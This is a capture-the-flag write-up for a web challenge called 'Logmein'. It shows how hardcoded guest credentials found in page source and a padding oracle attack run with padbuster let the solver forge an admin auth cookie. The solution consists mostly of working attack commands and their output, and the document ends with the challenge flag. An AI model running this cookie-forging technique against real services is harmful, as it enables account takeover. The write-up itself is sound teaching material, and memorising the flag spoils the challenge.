# Logmein

## Question Text

Pardon the shitty website design

`http://web.chal.gryphonctf.com:18703`

*Creator - PotatoDrug*

## Setup Guide
1. Run `./build.sh`

## Solution
View source at the index page and one of the comments contain `guest:guest` which is a valid account.

After logging in as guest we see the message 'I think the admin user has a more interesting profile', hinting that we need to become the admin user.

We are given a auth cookie which is encrypted upon logging in. If we alter with the cookie value we are given an error page, we can try using this to do a padding oracle attack.

We can see that padbuster successfully decrypted the encrypted value and the plaintext is user=guest.
```bash
➜ VAL="0kDV0sd/qVcniaQrNV1O9DjAljLexxYhHASgoRj3DH8="
➜ padbuster http://172.16.180.1:3000/profile $VAL 16 -cookies "auth=$VAL"
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=guest

[+] Decrypted value (HEX): 757365723D6775657374060606060606

[+] Decrypted value (Base64): dXNlcj1ndWVzdAYGBgYGBg==
```

Now our we just have to change that to `user=admin`
```bash
-------------------------------------------------------
➜ padbuster http://172.16.180.1:3000/profile $VAL 16 -cookies "auth=$VAL" -plaintext 'user=admin'
-------------------------------------------------------
** Finished ***

[+] Encrypted value is: 52U10BQGKRepGlfUJwshHQAAAAAAAAAAAAAAAAAAAAA%3D
-------------------------------------------------------
```

We can get the flag if we set the encrypted value of `user=admin` as our cookie value.
```bash
➜ curl -s http://127.0.0.1:3000/profile --cookie "auth=52U10BQGKRepGlfUJwshHQAAAAAAAAAAAAAAAAAAAAA%3D" | grep -o 'GCTF{.*}'
GCTF{l34K1NG_1nF0Rm4710n_1n_Un3xP3C73d_w4YZ}
```

### Flag
`GCTF{l34K1NG_1nF0Rm4710n_1n_Un3xP3C73d_w4YZ}`

## Recommended Reads
* https://robertheaton.com/2013/07/29/padding-oracle-attack/
* https://www.youtube.com/watch?v=aH4DENMN_O4
